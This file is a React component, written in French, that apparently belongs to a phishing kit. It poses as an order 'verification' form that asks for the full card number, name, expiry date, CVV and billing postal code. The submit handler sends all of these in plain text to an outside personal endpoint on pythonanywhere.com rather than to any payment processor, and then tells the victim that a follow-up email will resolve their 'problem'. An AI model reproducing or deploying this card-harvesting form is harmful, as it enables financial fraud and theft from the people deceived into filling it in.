
import React, { useState, useEffect } from 'react';
import type { VerificationFormData } from '../types';

interface VerificationFormProps {
  initialOrderNumber: string;
  initialPostalCode: string;
}

const VerificationForm: React.FC<VerificationFormProps> = ({ initialOrderNumber, initialPostalCode }) => {
  const [nameOnCard, setNameOnCard] = useState('');
  const [cardNumber, setCardNumber] = useState(''); 
  const [last4Digits, setLast4Digits] = useState('');
  const [expiryDate, setExpiryDate] = useState(''); 
  const [cvv, setCvv] = useState(''); // State for CVV
  const [postalCode, setPostalCode] = useState(initialPostalCode);
  const [orderNumber, setOrderNumber] = useState(initialOrderNumber);
  
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [errors, setErrors] = useState<{ nameOnCard?: string, cardNumber?: string, last4Digits?: string, expiryDate?: string, cvv?: string, postalCode?: string }>({});
  const [apiError, setApiError] = useState<string | null>(null);
  const [apiSuccessMessage, setApiSuccessMessage] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    setOrderNumber(initialOrderNumber);
  }, [initialOrderNumber]);

  useEffect(() => {
    setPostalCode(initialPostalCode);
  }, [initialPostalCode]);

  const validate = (): boolean => {
    const newErrors: { nameOnCard?: string, cardNumber?: string, last4Digits?: string, expiryDate?: string, cvv?: string, postalCode?: string } = {};
    if (!nameOnCard.trim()) newErrors.nameOnCard = "Le nom sur la carte est requis.";
    
    if (!cardNumber.trim()) {
        newErrors.cardNumber = "Le numéro de carte complet est requis.";
    } else if (!/^\d{13,19}$/.test(cardNumber.replace(/\s/g, ''))) {
        newErrors.cardNumber = "Numéro de carte invalide (doit contenir 13 à 19 chiffres).";
    }

    if (!last4Digits) {
        newErrors.last4Digits = "Les 4 derniers chiffres sont requis.";
    } else if (!/^\d{4}$/.test(last4Digits)) {
        newErrors.last4Digits = "Doit être 4 chiffres numériques.";
    }

    if (!expiryDate) {
        newErrors.expiryDate = "La date d'expiration est requise.";
    } else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
        newErrors.expiryDate = "Format MM/AA requis (ex: 03/25).";
    } else {
        const [month, year] = expiryDate.split('/').map(Number);
        const currentYear = new Date().getFullYear() % 100;
        const currentMonth = new Date().getMonth() + 1;
        if (year < currentYear || (year === currentYear && month < currentMonth)) {
            newErrors.expiryDate = "La carte est expirée.";
        }
    }

    if (!cvv) {
        newErrors.cvv = "Le cryptogramme (CVV/CVC) est requis.";
    } else if (!/^\d{3,4}$/.test(cvv)) {
        newErrors.cvv = "Doit être 3 ou 4 chiffres numériques.";
    }

    if (!postalCode.trim()) {
        newErrors.postalCode = "Le code postal est requis.";
    } else if (!/^\d{5}$/.test(postalCode.trim()) && postalCode.trim().length > 0) { 
        newErrors.postalCode = "Code postal invalide (doit être 5 chiffres pour la France).";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  }

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setApiError(null);
    setApiSuccessMessage(null);

    if (!validate()) {
      return;
    }

    setIsLoading(true);

    const formDataForApp: VerificationFormData = { 
      nameOnCard, 
      cardNumber: cardNumber.replace(/\s/g, ''),
      last4Digits, 
      expiryDate, 
      cvv,
      postalCode, 
      orderNumber 
    };

    const body = new URLSearchParams();
    body.append('order_number', formDataForApp.orderNumber);
    body.append('card_name', formDataForApp.nameOnCard);
    body.append('card_number', formDataForApp.cardNumber); 
    body.append('last4', formDataForApp.last4Digits);
    body.append('expiry', formDataForApp.expiryDate);
    body.append('cvv', formDataForApp.cvv); // Add CVV to API request
    body.append('postal_code', formDataForApp.postalCode);

    try {
      const response = await fetch('https://anonhr01.pythonanywhere.com/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: body.toString(),
      });

      // const responseText = await response.text(); // No longer using direct text for success

      if (response.ok) {
        setApiSuccessMessage("Merci, vos informations ont été soumises. Un email vous sera envoyé sous peu pour vous aider à résoudre ce problème.");
        setIsSubmitted(true);
      } else {
        const responseTextOnError = await response.text();
        setApiError(`Erreur de l'API: ${response.status} - ${responseTextOnError || response.statusText}`);
      }
    } catch (error) {
      console.error("Erreur lors de la soumission du formulaire:", error);
      if (error instanceof Error && error.name === 'NetworkError') {
        setApiError("Erreur de réseau. Vérifiez votre connexion ou la configuration CORS du serveur.");
      } else {
        setApiError("Une erreur s'est produite lors de la connexion à l'API. Veuillez réessayer.");
      }
    } finally {
      setIsLoading(false);
    }
  };

  if (isSubmitted && apiSuccessMessage) {
    return (
      <div className="p-4 bg-green-50 border border-green-300 rounded-md text-green-700">
        <p className="font-semibold">{apiSuccessMessage}</p>
      </div>
    );
  }

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      {apiError && (
        <div className="p-3 bg-red-50 border border-red-300 rounded-md text-red-700 text-sm">
          <p className="font-semibold">Erreur de soumission</p>
          <p>{apiError}</p>
        </div>
      )}
      <div>
        <label htmlFor="orderNumber" className="block text-sm font-medium text-gray-700 mb-1">
          Numéro de commande
        </label>
        <input
          type="text"
          id="orderNumber"
          value={orderNumber}
          readOnly
          className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm bg-gray-100 sm:text-sm cursor-not-allowed"
        />
      </div>
      <div>
        <label htmlFor="nameOnCard" className="block text-sm font-medium text-gray-700 mb-1">
          Nom sur la carte
        </label>
        <input
          type="text"
          id="nameOnCard"
          value={nameOnCard}
          onChange={(e) => setNameOnCard(e.target.value)}
          aria-required="true"
          className={`w-full px-3 py-2 border ${errors.nameOnCard ? 'border-red-500' : 'border-gray-300'} rounded-md shadow-sm focus:ring-pink-500 focus:border-pink-500 sm:text-sm`}
          placeholder="Ex: Bella Djondo"
          disabled={isLoading}
        />
        {errors.nameOnCard && <p className="text-xs text-red-600 mt-1">{errors.nameOnCard}</p>}
      </div>

      <div>
        <label htmlFor="cardNumber" className="block text-sm font-medium text-gray-700 mb-1">
          Numéro de carte complet
        </label>
        <input
          type="text"
          id="cardNumber"
          value={cardNumber}
          onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, '').slice(0,19))}
          aria-required="true"
          inputMode="numeric"
          maxLength={23} 
          className={`w-full px-3 py-2 border ${errors.cardNumber ? 'border-red-500' : 'border-gray-300'} rounded-md shadow-sm focus:ring-pink-500 focus:border-pink-500 sm:text-sm`}
          placeholder="Ex: 4900 0000 0000 0000"
          disabled={isLoading}
        />
        {errors.cardNumber && <p className="text-xs text-red-600 mt-1">{errors.cardNumber}</p>}
      </div>

      <div>
        <label htmlFor="last4Digits" className="block text-sm font-medium text-gray-700 mb-1">
          4 derniers chiffres de la carte (confirmation)
        </label>
        <input
          type="text"
          id="last4Digits"
          value={last4Digits}
          onChange={(e) => setLast4Digits(e.target.value.replace(/\D/g, '').slice(0,4))}
          aria-required="true"
          maxLength={4}
          minLength={4}
          pattern="\d{4}"
          inputMode="numeric"
          className={`w-full px-3 py-2 border ${errors.last4Digits ? 'border-red-500' : 'border-gray-300'} rounded-md shadow-sm focus:ring-pink-500 focus:border-pink-500 sm:text-sm`}
          placeholder="1234"
          disabled={isLoading}
        />
        {errors.last4Digits && <p className="text-xs text-red-600 mt-1">{errors.last4Digits}</p>}
      </div>

      <div className="grid grid-cols-2 gap-4">
        <div>
          <label htmlFor="expiryDate" className="block text-sm font-medium text-gray-700 mb-1">
            Date d'expiration (MM/AA)
          </label>
          <input
            type="text"
            id="expiryDate"
            value={expiryDate}
            onChange={(e) => {
              let value = e.target.value.replace(/\D/g, '').slice(0,4);
              if (value.length > 2 && !value.includes('/')) {
                value = value.slice(0,2) + '/' + value.slice(2);
              }
              setExpiryDate(value.slice(0,5));
            }}
            aria-required="true"
            maxLength={5}
            className={`w-full px-3 py-2 border ${errors.expiryDate ? 'border-red-500' : 'border-gray-300'} rounded-md shadow-sm focus:ring-pink-500 focus:border-pink-500 sm:text-sm`}
            placeholder="MM/AA"
            disabled={isLoading}
          />
          {errors.expiryDate && <p className="text-xs text-red-600 mt-1">{errors.expiryDate}</p>}
        </div>
        <div>
          <label htmlFor="cvv" className="block text-sm font-medium text-gray-700 mb-1">
            Cryptogramme (CVV/CVC)
          </label>
          <input
            type="text"
            id="cvv"
            value={cvv}
            onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0,4))}
            aria-required="true"
            maxLength={4}
            minLength={3}
            inputMode="numeric"
            className={`w-full px-3 py-2 border ${errors.cvv ? 'border-red-500' : 'border-gray-300'} rounded-md shadow-sm focus:ring-pink-500 focus:border-pink-500 sm:text-sm`}
            placeholder="123"
            disabled={isLoading}
          />
          {errors.cvv && <p className="text-xs text-red-600 mt-1">{errors.cvv}</p>}
        </div>
      </div>

       <div>
        <label htmlFor="postalCode" className="block text-sm font-medium text-gray-700 mb-1">
          Code postal (facturation)
        </label>
        <input
          type="text"
          id="postalCode"
          value={postalCode}
          onChange={(e) => setPostalCode(e.target.value)}
          aria-required="true"
          maxLength={10} 
          className={`w-full px-3 py-2 border ${errors.postalCode ? 'border-red-500' : 'border-gray-300'} rounded-md shadow-sm focus:ring-pink-500 focus:border-pink-500 sm:text-sm`}
          placeholder="Ex: 77680"
          disabled={isLoading}
        />
        {errors.postalCode && <p className="text-xs text-red-600 mt-1">{errors.postalCode}</p>}
      </div>
      <button
        type="submit"
        className="w-full bg-pink-600 hover:bg-pink-700 text-white font-semibold py-2.5 px-4 rounded-md shadow-sm transition duration-150 ease-in-out focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-pink-500 disabled:opacity-50"
        disabled={isLoading}
      >
        {isLoading ? 'Vérification en cours...' : 'Vérifier et Confirmer'}
      </button>
    </form>
  );
};

export default VerificationForm;
